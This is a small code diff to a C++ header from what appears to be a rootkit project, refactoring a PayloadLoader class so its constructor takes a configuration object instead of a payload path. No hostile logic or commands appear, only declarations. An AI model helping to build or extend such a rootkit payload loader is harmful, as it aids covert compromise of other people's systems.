@@ -4,6 +4,7 @@
 #include <optional>
 #include <sys/types.h>
 #include <string>
+#include "rootkit/ConfigManager.hpp"
 #include "rootkit/issues/Error.hpp"
 #include "rootkit/issues/Info.hpp"
 #include "rootkit/issues/Logger.hpp"
@@ -27,7 +28,7 @@ public:
      * @brief Basic constructor
      * @param payload_path Path to the payload
      */
-    PayloadLoader(const std::string& payload_path, const issues::Logger& logger);
+    PayloadLoader(const PayloadConfig& conf, const issues::Logger& logger);
 
     /**
      * @brief Stops payload from running
